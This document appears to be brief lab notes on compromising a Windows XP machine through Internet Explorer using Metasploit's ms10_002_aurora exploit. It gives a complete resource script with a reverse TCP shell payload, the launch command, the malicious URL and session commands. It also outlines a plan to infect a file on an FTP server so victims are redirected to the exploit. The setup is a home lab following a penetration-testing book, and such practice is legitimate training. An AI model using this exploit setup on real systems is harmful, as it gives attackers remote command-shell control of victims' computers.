Whats the plan.
    Find the file
    Infect the file

How it will work
    Metasploit will create malcious server with url 
    when victim visits that url then we will get control of his CMD by redirecting him.


Creating an exploit server using Metasploit

create `exploit_server.rc` with following commands

exploit_server.rc
```
use exploit/windows/browser/ms10_002_aurora
set LHOST 192.168.10.10
set SRVHOST 192.168.10.10
set URIPATH /exploit
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.10.10
set LPORT 443
run
```

run that file with `msfconsole -r exploit_server.rc`

install and configure xp in virutalbox as described by georgia weidman in his book penteration testing.

In IE browser visit exploit server url. in our case it will be http://192.168.10.10:8080/exploit

For successfull exploit you will you have control of windows cmd.
run `sessions` to see list of sessions
run `sessions -i 1` to use session created after visiting exploit server url.
you can run `dir` inside kali msfconole shell to verify that you have access



Next write infectPage Script
Run vsftpd server, place file on that server, then run infectPage script
